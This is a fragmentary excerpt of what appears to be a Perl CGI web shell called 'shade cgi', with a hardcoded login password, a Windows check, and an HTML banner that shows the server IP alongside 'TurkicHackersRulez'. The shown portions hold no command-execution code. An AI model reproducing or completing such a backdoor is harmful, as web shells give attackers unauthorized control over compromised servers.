...
$Password = "shade";			# Change this. You will need to enter this
				# to login.
sub Is_Win(){
...
<tr>
	...
	<td>Server IP:<font color="red"> $ENV{'SERVER_ADDR'}</font> | Your IP: <font color="red">TurkicHackersRulez</font>
	</td>
</tr>
<tr>
<td colspan="2">
...
{
	print "<br>
	<font color=red>=</font><font color=red>---&gt;<font color=#ff9900>shade cgi</font>&lt;---=</font></code>
</center></body></html>";
}
#------------------------------------------------------------------------------
